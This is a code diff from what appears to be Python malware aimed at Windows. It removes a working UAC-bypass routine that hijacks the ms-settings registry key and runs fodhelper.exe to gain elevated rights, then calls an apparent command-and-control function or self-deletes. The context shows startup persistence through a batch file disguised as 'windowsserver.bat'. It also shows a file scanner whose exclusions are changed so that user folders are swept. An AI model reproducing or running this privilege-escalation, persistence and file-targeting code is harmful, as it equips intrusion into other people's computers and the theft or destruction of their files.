@@ -97,64 +97,6 @@ class functions():
 
   @staticmethod
   # TEST ON PC
-  def UAC_bypass():
-    CMD = r"C:\Windows\System32\cmd.exe"
-    FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
-    PYTHON_CMD = "python"
-    REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
-    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
-
-    def is_running_as_admin():
-      try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-      except:
-        return True
-
-    def create_reg_key(key, value):
-      try:
-        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
-        winreg.CloseKey(registry_key)
-      except WindowsError:
-        raise
-
-    def bypass_uac(cmd):
-      try:
-        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
-        create_reg_key(None, cmd)
-      except WindowsError:
-        raise
-
-    def execute():
-      if is_running_as_admin():
-        pass
-        try:
-          current_dir = os.path.dirname(
-            os.path.realpath(__file__)) + '\\' + __file__
-          cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
-          bypass_uac(cmd)
-          os.system(FOD_HELPER)
-          CC()
-        except WindowsError:
-          functions.seppuku()
-          sys.exit(0)
-      else:
-        pass
-
-  # ALTERNATIVE BYPASS (TEST FIRST)
-  #def UACbypass():
-  #try:
-  # Get the current value of the UAC
-  #val = ctypes.windll.shell32.IsUserAnAdmin()
-  # Set the UAC to 0 (disabled)
-  #ctypes.windll.shell32.SetUserAccountControl(0)
-  #return val
-  #except:
-  #sys.exit(1)
-
-  @staticmethod
-  # TEST ON PC
   def startup_surprise():
     with open(startupDir + '/windowsserver.bat', 'w') as fin:
       fin.write('''
@@ -180,7 +122,7 @@ Loop
 
     def scanrecurse(baseDir):
       files = []
-      restrictedFiles = ['Windows', 'Users']
+      restrictedFiles = ['Windows', 'Program Files', 'Program Files (x86)']
       for r, d, f in os.walk(baseDir):
         for file in f:
           filepath = os.path.join(r, file)
